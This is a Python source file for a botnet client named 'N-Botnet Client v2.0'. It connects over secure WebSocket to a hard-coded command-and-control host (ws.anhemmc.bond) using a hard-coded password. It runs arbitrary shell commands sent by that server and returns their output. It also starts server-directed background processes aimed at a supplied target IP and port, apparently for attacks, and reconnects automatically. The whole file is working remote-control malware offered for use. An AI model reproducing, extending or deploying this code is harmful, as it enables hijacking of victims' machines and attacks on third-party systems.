#!/usr/bin/env python3
"""
N-Botnet Client
===============
Terminal client that connects to the N-Botnet server.
Authenticates with password, receives commands, executes them, and sends results back.

Usage:
  python3 client.py <server_ip> [password]
  python3 client.py 192.168.1.100 idlerhadeptrai
"""

import asyncio
import json
import os
import platform
import signal
import socket
import subprocess
import sys
import time
import ssl  # THÊM DÒNG NÀY

import websockets

# ===== CONFIG =====
SERVER = "ws.anhemmc.bond"
PORT = 443
PASSWORD = "idlerhadeptrai"
RECONNECT_DELAY = 5  # Seconds before reconnecting
USE_SSL = True  # BẬT SSL

# ===== STATE =====
running_process = None    # Current long-running process
running_cmd_id = None     # cmd_id of running process
running_target = ""       # Target info (ip:port)


async def execute_command(command):
    """Execute a shell command and return output (one-shot, waits for completion)."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout
        if result.stderr:
            output += "\n[STDERR]\n" + result.stderr
        if result.returncode != 0:
            output += f"\n[EXIT CODE: {result.returncode}]"
        return output
    except subprocess.TimeoutExpired:
        return "[!] Command timed out (30s)"
    except Exception as e:
        return f"[!] Error: {str(e)}"


async def run_process_in_background(command, cmd_id, target_ip, target_port, websocket, client_id):
    """Run a command in the background. Can be stopped with 'stop' message."""
    global running_process, running_cmd_id, running_target
    
    target_str = f"{target_ip}:{target_port}" if target_ip else ""
    running_target = target_str
    
    try:
        # Create subprocess with pipes
        running_process = await asyncio.create_subprocess_shell(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        running_cmd_id = cmd_id
        
        print(f"[→] Background process started [PID: {running_process.pid}]: {command}")
        print(f"    Target: {target_str}")
        
        # Send start confirmation
        await websocket.send(json.dumps({
            "type": "result",
            "cmd_id": cmd_id,
            "client_id": client_id,
            "output": f"[+] Process started (PID: {running_process.pid}) targeting {target_str}\n"
        }))
        
        # Read output line by line
        async def read_stream(stream, label):
            while running_process and not running_process.returncode:
                try:
                    line = await asyncio.wait_for(stream.readline(), timeout=1.0)
                    if line:
                        text = line.decode('utf-8', errors='replace').rstrip()
                        print(f"  [{label}] {text}")
                        # Send incremental output
                        try:
                            await websocket.send(json.dumps({
                                "type": "result",
                                "cmd_id": cmd_id,
                                "client_id": client_id,
                                "output": f"[{label}] {text}\n"
                            }))
                        except:
                            pass
                    else:
                        break
                except asyncio.TimeoutError:
                    continue
                except Exception:
                    break
        
        # Read stdout and stderr concurrently
        stdout_task = asyncio.create_task(read_stream(running_process.stdout, "stdout"))
        stderr_task = asyncio.create_task(read_stream(running_process.stderr, "stderr"))
        
        # Wait for process to finish
        returncode = await running_process.wait()
        
        # Cancel the reader tasks
        stdout_task.cancel()
        stderr_task.cancel()
        
        final_msg = f"\n[✓] Process exited with code {returncode}"
        print(final_msg)
        
        # Send final output
        try:
            await websocket.send(json.dumps({
                "type": "result",
                "cmd_id": cmd_id,
                "client_id": client_id,
                "output": final_msg
            }))
        except:
            pass
        
    except asyncio.CancelledError:
        print("[!] Background process task cancelled")
    except Exception as e:
        print(f"[!] Background process error: {e}")
        try:
            await websocket.send(json.dumps({
                "type": "result",
                "cmd_id": cmd_id,
                "client_id": client_id,
                "output": f"[!] Error: {str(e)}\n"
            }))
        except:
            pass
    finally:
        running_process = None
        running_cmd_id = None
        running_target = ""


async def stop_process(websocket, client_id, cmd_id=""):
    """Stop the currently running background process."""
    global running_process, running_cmd_id
    
    if running_process and running_process.returncode is None:
        pid = running_process.pid
        print(f"[!] Stopping process PID: {pid}...")
        
        try:
            # Send SIGTERM first, then SIGKILL after 3s
            running_process.send_signal(signal.SIGTERM)
            
            try:
                await asyncio.wait_for(running_process.wait(), timeout=3.0)
                print(f"[✓] Process {pid} terminated gracefully")
            except asyncio.TimeoutError:
                print(f"[!] Process {pid} didn't respond to SIGTERM, sending SIGKILL...")
                running_process.send_signal(signal.SIGKILL)
                await running_process.wait()
                print(f"[✓] Process {pid} killed")
            
        except Exception as e:
            print(f"[!] Error stopping process: {e}")
        
        # Send stop confirmation
        try:
            await websocket.send(json.dumps({
                "type": "result",
                "cmd_id": running_cmd_id or cmd_id,
                "client_id": client_id,
                "output": "[■] Process stopped by server\n"
            }))
        except:
            pass
        
        running_process = None
        running_cmd_id = None
        return True
    
    return False


async def run_client():
    """Main client loop — connect, auth, listen for commands."""
    global running_process, running_cmd_id, running_target
    
    reconnect = True
    
    while reconnect:
        try:
            # ===== SỬA CHỖ NÀY =====
            if USE_SSL:
                uri = f"wss://{SERVER}:{PORT}"  # WSS cho SSL
            else:
                uri = f"ws://{SERVER}:{PORT}"   # WS cho non-SSL
            
            print(f"[*] Connecting to {uri}...")
            
            # ===== THÊM SSL CONTEXT =====
            if USE_SSL:
                ssl_context = ssl.create_default_context()
                # Nếu muốn bỏ qua verify certificate (không khuyến khích)
                # ssl_context.check_hostname = False
                # ssl_context.verify_mode = ssl.CERT_NONE
                connect_kwargs = {"ssl": ssl_context}
            else:
                connect_kwargs = {}
            
            async with websockets.connect(uri, **connect_kwargs) as websocket:
                hostname = socket.gethostname()
                
                # Auth
                await websocket.send(json.dumps({
                    "type": "auth",
                    "password": PASSWORD,
                    "hostname": hostname
                }))
                
                response = await websocket.recv()
                data = json.loads(response)
                
                if data.get("type") == "auth_fail":
                    print(f"[!] Auth failed: {data.get('reason', 'Wrong password')}")
                    return
                
                if data.get("type") == "auth_ok":
                    client_id = data.get("client_id", "unknown")
                    print(f"[+] Connected! Client ID: {client_id}")
                    print(f"[*] Waiting for commands...")
                    await websocket.send(json.dumps({"type": "ping"}))
                
                # Main message loop
                async for message in websocket:
                    try:
                        data = json.loads(message)
                    except json.JSONDecodeError:
                        continue
                    
                    msg_type = data.get("type", "")
                    
                    if msg_type == "command":
                        # One-shot command (waits for completion)
                        command = data.get("command", "")
                        cmd_id = data.get("cmd_id", "")
                        
                        print(f"\n[→] Command [{cmd_id}]: {command}")
                        print("[*] Executing...")
                        
                        output = await execute_command(command)
                        
                        display = output[:500] + "..." if len(output) > 500 else output
                        print(f"[←] Result:\n{display}")
                        print(f"[*] Sending result...")
                        
                        await websocket.send(json.dumps({
                            "type": "result",
                            "cmd_id": cmd_id,
                            "client_id": client_id,
                            "output": output
                        }))
                        print("[✓] Sent!")
                    
                    elif msg_type == "execute":
                        # Long-running command (background, can be stopped)
                        command = data.get("command", "")
                        cmd_id = data.get("cmd_id", "")
                        target_ip = data.get("target_ip", "")
                        target_port = data.get("target_port", "")
                        
                        print(f"\n[→] Execute [{cmd_id}]: {command}")
                        print(f"    Target: {target_ip}:{target_port}")
                        
                        # Start background process
                        asyncio.create_task(
                            run_process_in_background(
                                command, cmd_id, target_ip, target_port,
                                websocket, client_id
                            )
                        )
                    
                    elif msg_type == "stop":
                        cmd_id = data.get("cmd_id", "")
                        print(f"\n[→] Stop signal received")
                        stopped = await stop_process(websocket, client_id, cmd_id)
                        if stopped:
                            print("[✓] Process stopped")
                        else:
                            print("[-] No running process to stop")
                            await websocket.send(json.dumps({
                                "type": "result",
                                "cmd_id": cmd_id,
                                "client_id": client_id,
                                "output": "[-] No running process\n"
                            }))
                    
                    elif msg_type == "status":
                        # Return current process status
                        status = "idle"
                        if running_process and running_process.returncode is None:
                            status = f"running (PID: {running_process.pid})"
                        
                        await websocket.send(json.dumps({
                            "type": "result",
                            "cmd_id": data.get("cmd_id", ""),
                            "client_id": client_id,
                            "output": json.dumps({
                                "status": status,
                                "target": running_target,
                                "pid": running_process.pid if running_process else None
                            })
                        }))
                    
                    elif msg_type == "ping":
                        await websocket.send(json.dumps({"type": "pong"}))
                    
                    elif msg_type == "pong":
                        pass
        
        except websockets.exceptions.ConnectionClosed:
            print(f"[!] Connection lost. Reconnecting in {RECONNECT_DELAY}s...")
            await asyncio.sleep(RECONNECT_DELAY)
        
        except (ConnectionRefusedError, OSError) as e:
            print(f"[!] Cannot connect: {e}")
            print(f"[*] Retrying in {RECONNECT_DELAY}s...")
            await asyncio.sleep(RECONNECT_DELAY)
        
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
            reconnect = False
            break


def print_banner():
    print("=" * 50)
    print("  N-Botnet Client v2.0")
    print("  Remote Device Client")
    print("=" * 50)
    print(f"  Server  : {SERVER}:{PORT}")
    print(f"  Hostname: {socket.gethostname()}")
    print(f"  System  : {platform.system()} {platform.release()}")
    print("=" * 50)


def main():
    print_banner()
    try:
        asyncio.run(run_client())
    except KeyboardInterrupt:
        print("\n[*] Exiting...")


if __name__ == "__main__":
    main()
